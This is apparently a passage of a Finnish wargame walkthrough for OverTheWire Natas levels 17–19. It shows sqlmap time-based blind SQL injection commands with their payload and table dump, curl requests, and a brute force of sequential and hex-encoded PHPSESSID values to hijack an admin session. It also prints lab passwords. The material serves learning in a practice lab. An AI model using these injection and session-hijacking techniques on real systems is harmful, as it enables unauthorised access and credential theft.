[19:07:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:07:00] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
[19:07:44] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[19:07:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[19:09:18] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:09:18] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:09:18] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:09:18] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:09:18] [INFO] testing for SQL injection on parameter 'Referer'
[19:09:19] [WARNING] parameter 'Referer' does not seem to be injectable
[19:09:19] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:09:19] [INFO] testing for SQL injection on parameter 'Host'
[19:09:19] [WARNING] parameter 'Host' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
---
[19:09:19] [INFO] the back-end DBMS is MySQL
[19:09:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[19:09:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
[19:09:19] [WARNING] your sqlmap version is outdated

[*] ending @ 19:09:19 /2025-05-21/
```

Tuloksena kertoi on onnistunut ja kohde on haavoittuvua SQL injektio just kyseisen **time-based blind sql injectiolle**.



## 📥 Mitä seuraavaksi?
1️⃣ Listata tietokannan taulut:

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
--auth-type=Basic \
--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
--data="username=natas18" \
--technique=T --time-sec=5 \
--level=5 --risk=3 \
--tables -D natas17
        ___
       __H__                                                                                                              
 ___ ___[,]_____ ___ ___  {1.8.5#stable}                                                                                  
|_ -| . ["]     | .'| . |                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:12:32 /2025-05-21/

[19:12:32] [INFO] resuming back-end DBMS 'mysql' 
[19:12:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
---
[19:12:32] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[19:12:32] [INFO] fetching tables for database: 'natas17'
[19:12:32] [INFO] fetching number of tables for database 'natas17'
[19:12:32] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[19:12:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
1
[19:12:42] [INFO] retrieved: users
Database: natas17
[1 table]
+-------+
| users |
+-------+

[19:13:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
[19:13:59] [WARNING] your sqlmap version is outdated

[*] ending @ 19:13:59 /2025-05-21/
```


2️⃣ Näyttää sarakkeet users-taulusta:

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
--auth-type=Basic \
--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
--data="username=natas18" \
--technique=T --time-sec=5 \
--level=5 --risk=3 \
--column -D natas17 -T users    
        ___
       __H__                                                                                                              
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                  
|_ -| . [)]     | .'| . |                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:23:13 /2025-05-21/

[19:23:14] [INFO] resuming back-end DBMS 'mysql' 
[19:23:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
---
[19:23:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[19:23:14] [INFO] fetching columns for table 'users' in database 'natas17'
[19:23:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[19:23:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[19:23:41] [ERROR] invalid character detected. retrying..
2
[19:24:20] [ERROR] invalid character detected. retrying..

[19:24:20] [INFO] retrieved: 
[19:24:48] [ERROR] invalid character detected. retrying..
u
[19:26:22] [ERROR] invalid character detected. retrying..
sernam
[19:27:58] [ERROR] invalid character detected. retrying..
[19:28:39] [ERROR] invalid character detected. retrying..
e
[19:28:50] [INFO] retrieved: v
[19:29:53] [ERROR] invalid character detected. retrying..
archar(64)
[19:32:41] [INFO] retrieved: 
[19:33:13] [ERROR] invalid character detected. retrying..
pas
[19:34:54] [ERROR] invalid character detected. retrying..
sword
[19:36:23] [INFO] retrieved: va
[19:37:36] [ERROR] invalid character detected. retrying..
r
[19:38:33] [ERROR] invalid character detected. retrying..
cha
[19:39:52] [ERROR] invalid character detected. retrying..
r
[19:40:43] [ERROR] invalid character detected. retrying..
(6
[19:41:49] [ERROR] invalid character detected. retrying..
4^C

[19:42:31] [WARNING] your sqlmap version is outdated

[*] ending @ 19:42:31 /2025-05-21/
```

Tämä on normaalia tällaisissa hyökkäyksissä, koska:
- Palvelin ei anna suoraa vastausta
- SQLMap tekee yksi merkki kerrallaan, viiveellä useita HTTP-pyyntöjä
- Lisäksi verkkoyhteys, palvelimen kuorma tai noise voi aiheuttaa virhei

3️⃣ Hakea tiedot (esim. käyttäjät + salasanat):

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
--auth-type=Basic \
--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
--data="username=natas18" \
--technique=T --time-sec=5 \
--level=5 --risk=3 \
--dump -T users -D natas17
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:43:59 /2025-05-21/

[19:43:59] [INFO] resuming back-end DBMS 'mysql' 
[19:43:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
---
[19:44:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[19:44:00] [INFO] fetching columns for table 'users' in database 'natas17'
[19:44:00] [INFO] resumed: 2
[19:44:00] [INFO] resumed: username
[19:44:00] [INFO] resumed: password
[19:44:00] [INFO] fetching entries for table 'users' in database 'natas17'
[19:44:00] [INFO] fetching number of entries for table 'users' in database 'natas17'
[19:44:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[19:44:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[19:44:09] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
0xjsNNj
[19:47:48] [ERROR] invalid character detected. retrying..
GvHkb7p
[19:51:14] [ERROR] invalid character detected. retrying..
wgC6PrAyLNT0pYCqHd
[19:58:02] [INFO] retrieved: user1
[19:59:12] [INFO] retrieved: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
[20:10:11] [INFO] retrieved: natas18
[20:11:51] [INFO] retrieved: MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2
[20:22:42] [INFO] retrieved: user2
[20:23:57] [INFO] retrieved: VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD
[20:35:24] [INFO] retrieved: user3
Database: natas17
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd | user1    |
| 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18  |
| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | user2    |
| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
+----------------------------------+----------+

[20:36:44] [INFO] table 'natas17.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org/dump/natas17/users.csv'                                                                                        
[20:36:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
[20:36:44] [WARNING] your sqlmap version is outdated

[*] ending @ 20:36:44 /2025-05-21/
```

---

# Natas 18 - START HERE;

6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18

Kokeiltiin username ja password molempiin "admin" - se potki minut istunnosta ja kirjauduttua takaisin natas 18 tunnuksella ja sen salasanalla jonka purettiin aikaisemmin niin palattua sisään lukee näin 

"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19." . - Tämä tarkoittaa uusi istunto on alkanut. Nyt ei päästä takaisin etusivulle jossa voidaan syöttää sitä kirjauttumisen lomaketta eli username;password.

Siinä view source koodin pätkän funktiossa ainakin if-else parametrissä on nimetty jos on "admin" niin se pätevä osuus ikään kuin toimii ja alkaa uusi istunto. 

Sama kokeiltu tällä SQL injektio keinolla **admin" OR 1=1 --"**, mutta sekin menee samaan sivustoon ja näkymänsä eli "You are logged in as regular case.."

**Miten halutaan tyhjentää ja unohtaa se kirjauttumisen istunto?** Chrome: F12 --> Application ja siitä "cookies" alempi ja ensimmäinen vaihtoehto siitä oikea hiiren klikkaus ja "clear" ja sitten päivitä sivusto. Ei se välttämättä toimi yhdellä päivityksellä kannattaa kokeila toisen/kolmannen kerran ja poistaa eväste istunto.


## selvittämistä ja pähkäilyä

sivuston - index-source.html sivuston mukaan siellä lukee näin

Tämä luku koskien on varmasti toi PHPSESSID - jossa chrome:ssa tyhjennettiin/poistettiin evästeiden tietoja ja voi olla tästä pitää saada täsmällinen luku. Tämä luku on riittävän alhainen, jotta PHPSESSID-muuttujaan voidaan kohdistaa raa'alla voimalla hyökkäys istunnon kaappaamiseksi (**session hijacking**). 
- $maxid = 640; // 640 should be enough for everyone





## Kali Linux komentoja - START HERE;

Muutama curl komentoja testaillaan

Aika perus:
┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas18.natas.labs.overthewire.org/" http://natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ@natas18.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>



└─$ curl -I -H "Referer: http://natas19.natas.labs.overthewire.org/" -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" http://natas18.natas.labs.overthewire.org/index-source.html

┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas19.natas.labs.overthewire.org/" -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" http://natas18.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Thu, 10 Jul 2025 16:40:56 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "343e-6326d434e63ca"
Accept-Ranges: bytes
Content-Length: 13374
Vary: Accept-Encoding
Content-Type: text/html



Tässä ensimmäisennä haluttaan muuttaa natas18 salasansa mukaan base64 muotoon (username + salasansa itsensä molemmat muuttuvat base64 muotoon)
┌──(kali㉿kali)-[~]
└─$ echo -n "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" | base64
bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
                                                                                                                                            Tässä ei toiminutkaan, mutta silti testattiin. Ajatuksena tässä oli syöttää base64 (username + password), PHPSESSID ei vielä oikea, silti testattiin toi **brute-force session ID:t** (0-640), kunnes löytö sessio admin          
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas18.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDRmdDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas18.natas.labs.overthewire.org Port 80</address>
</body></html>


Nyt alkoi pelittää voi olla jotakin kirjoitus tai muuta virhettä..
┌──(kali㉿kali)-[~]
└─$ echo -n "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" | base64
bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas18.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
 





┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas18.natas.labs.overthewire.org/index.php" \                                    
  --auth-type Basic \
  --auth-cred "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" \
  --data "username=admin&password=admin" \
  --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:57:22 /2025-07-10/

[19:57:23] [INFO] testing connection to the target URL
[19:57:24] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
[19:57:24] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[19:57:24] [WARNING] your sqlmap version is outdated

[*] ending @ 19:57:24 /2025-07-10/

--auth-type: command not found


SQLMapilla on perinteinen komento ensimmäisen tarkistuksen tekemiseen ja tämä on malli: 
**sqlmap -u "http://kohde.fi/sivu.php?id=1" --batch --risk=3 --level=5**


Tässä lisättynä käyttäjätunnus:salasansa, et miten se menee:
sqlmap -u "http://natas18.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" --batch --risk=3 --level=5



┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas18.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" --batch --risk=3 --level=5
        ___
       __H__                                                                                                                                          
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                                              
|_ -| . [']     | .'| . |                                                                                                                             
|___|_  [']_|_|_|__,|  _|                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:02:38 /2025-07-10/

[20:02:39] [INFO] testing connection to the target URL
[20:02:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:02:40] [INFO] testing if the target URL content is stable
[20:02:40] [INFO] target URL content is stable
[20:02:40] [INFO] testing if parameter 'User-Agent' is dynamic
[20:02:40] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[20:02:40] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[20:02:40] [INFO] testing for SQL injection on parameter 'User-Agent'
..................................
........................................
.............................................
[20:16:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:16:16] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[20:16:20] [WARNING] parameter 'Host' does not seem to be injectable
[20:16:20] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[20:16:20] [WARNING] your sqlmap version is outdated

[*] ending @ 20:16:20 /2025-07-10/


**Mitä tässä tuloksena tarkoittaa? (ylempi tulokset)**

🚫 "all tested parameters do not appear to be injectable"
SQLMap ei löytänyt injektoitavia parametreja testatuista kohdista.

Tämä voi johtua:
Sivuston hyvästä suojauksesta (esim. WAF eli Web Application Firewall).
Parametrien puutteellisesta tunnistamisesta.
Tarpeesta käyttää tarkempia asetuksia tai tamper-skriptejä.


🛡️ "try to use option '--tamper'"
SQLMap ehdottaa kokeilemaan --tamper-asetusta, joka muokkaa hyökkäyspyyntöjä ohittaakseen suojauksia.
Esimerkki: --tamper=space2comment muuttaa välilyönnit SQL-kommenteiksi, mikä voi hämätä WAF:ia.


## Jotakin uutta esille ja katsotaan netistä vihjeitä:

https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas18.md

https://learnhacking.io/overthewire-natas-level-18-walkthrough/

https://medium.com/hacker-toolbelt/natas-18-weak-session-id-exploitation-696458f4775e


Python koodi - se on yksi tapa laskea, se count-muuttuja joka käyttää sitä "PHPSESSID:le". Tämän ideana on kuin lähettää yhdessä basicAuth-tietoja GET pyynnön kautta ja periaatteessa laskee kuitenkin sen PHPSESSID luvunsa. Tosiaan vastaus PHPSESSID luku 119.


PHPSESSID=118
PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

PHPSESSID=120
PHPSESSID=121

---

# Natas 19 - START HERE;

natas19 | tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

Tämä on sama kuin aikaisepi taso eli 18, mutta **session ID:tä** ei ole saatavilla eli vaikeammaksi mennään. Ainakin tästä testattu yleis käyttäjätunnus ja salasanalla sisään (admin:admin) niin antoi uuden sivustson, jossa lukee näin:

**This page uses mostly the same code as the previous level, but session IDs are no longer sequential... You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.**

Sama jouduttiin clear sitä evästettä, josta sitten päästään tähän kirjauttumisen etusivulle eli syötä *username;password*. Voi olla tämä konfiguroitu *view-source.html* sama kuin aikaisempi, mutta tässä tasossa ei annetta lisää vihjeitä kuitenkaan paitsi tämä (ylempi kuvaus)

Myös sama testasin SQL injektiota, että ei antanut mitään vastausta, että tämä on vaikeampi ja koska PHPSESSID ei toistu peräkkäin. Siksi nyt tämä sulkee pois brutoe-force lähetymistavan.


## Kali linux - testausta START HERE;

└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html


┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Sat, 12 Jul 2025 16:30:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "45de-6326d434e830a"
Accept-Ranges: bytes
Content-Length: 17886
Vary: Accept-Encoding
Content-Type: text/html



┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas19.natas.labs.overthewire.org/" http://natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr@natas19.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>

<p>
Please login with your admin account to retrieve credentials for natas20.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
</div>
</body>
</html>



┌──(kali㉿kali)-[~]
└─$ echo -n "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" | base64
bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas19.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas19.natas.labs.overthewire.org Port 80</address>
</body></html>


## Netistä tarkistellaan tietoa ja vihjeitä

Otettin uusi yritys ainakin, josta username;password (admin) - niin antoi jonkinlaisen eväste luvun (cookies value) ja tarkistellaan mitä se luku oikein tarkoittakaan

menin *username;password* : admin ja se eväste luku on: 3131392d61646d696e 
Tästä luvusta muutettu hex decodes on 119-admin, kun joka kerta puhdistan/tyhjennän kirjauttuneen evästeen niin se luku muuttuu ja tarkistuksena tarkistettu se alku lukukin on eri.

**Tämä tarkoittaa dekoodaa hexmerkkijonon tekstiksi**:

┌──(kali㉿kali)-[~]
└─$ echo -n 3131392d61646d696e | xxd -r -p                             
119-admin                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ echo -n 39342d61646d696e | xxd -r -p
94-admin                                                                                                                                                                                                                                                                                Periaatteessa meidän nyt pitää selvittää tämä <VALUE>-admin mikä onkaan / tämä PHPSESSID luku mikä onkaan, jotta saadaan selvitettyä Natas20 salasansa. Periaatteessa sama tarkoittava, mutta vain dekoodattu dataa.

### Brute force START NOW;

Jossakin ohjeessa lisätään parametriä siihen, että se tekee sen satunnaisen ja suorittaa luvut järjestyksessä, kuin aikaisempi harjoitus natas 18 (menee PHPSESSID 1:stä 640 asti), mutta nyt mennään tällä <value>-admin. Tässäkin harjoituksessa menee sama Python koodilla, mutta vain lisätty pientä ominaisuutta sisään.


┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi19.py 
PHPSESSID=312d61646d696e
PHPSESSID=322d61646d696e
PHPSESSID=332d61646d696e
PHPSESSID=342d61646d696e
PHPSESSID=352d61646d696e
PHPSESSID=362d61646d696e
PHPSESSID=372d61646d696e
PHPSESSID=382d61646d696e
PHPSESSID=392d61646d696e
PHPSESSID=31302d61646d696e
PHPSESSID=31312d61646d696e
PHPSESSID=31322d61646d696e
..........


PHPSESSID=3237392d61646d696e
PHPSESSID=3238302d61646d696e
PHPSESSID=3238312d61646d696e
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>

PHPSESSID=3238322d61646d696e
PHPSESSID=3238332d61646d696e
PHPSESSID=3238342d61646d696e
............

PHPSESSID=3633352d61646d696e
PHPSESSID=3633362d61646d696e
PHPSESSID=3633372d61646d696e
PHPSESSID=3633382d61646d696e
PHPSESSID=3633392d61646d696e
PHPSESSID=3634302d61646d696e
Done!



Jos tarkistellaan toi luku "3238312d61646d696e" varmuuden vuoksi:

┌──(kali㉿kali)-[~]
